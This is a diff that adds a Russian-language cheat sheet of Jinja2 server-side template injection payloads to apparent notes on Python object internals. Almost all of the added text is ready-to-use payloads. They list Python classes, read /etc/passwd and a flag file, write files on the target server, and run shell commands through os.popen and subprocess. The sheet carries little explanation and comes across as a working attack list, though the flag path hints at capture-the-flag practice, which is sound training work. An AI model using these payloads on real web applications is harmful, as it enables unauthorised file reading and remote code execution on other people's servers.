@@ -74,3 +74,47 @@ __globals__ Ссылка на словарь, содержащий глобал�
 {{''.__class__.__mro__[2]. Subclasses__()}}
 {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
 ```
+
+
+# Cheet shet
+### Jinja2
+
+#### Получение списка классов:
+```
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+```
+#### Чтение файлов с удаленного сервера:
+```
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+#### Запись в файл на удаленном сервере:
+```
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt','w').write('Hello here !') }}
+```
+#### Выполнение файлов на удаленном сервере:
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+```
+#### Для Python 3
+ #### Чтение файлов с удаленного сервера:
+```
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}
+```
+#### Выполнение файлов на удаленном сервере:
+```
+{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("_
+_import__('os').popen('id').read()")}}
+{{''.__class__.__mro__[1].__subclasses__()[280]('id', shell=True, stdout=-1).communicate()}}
+{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('id').read()}}
+```
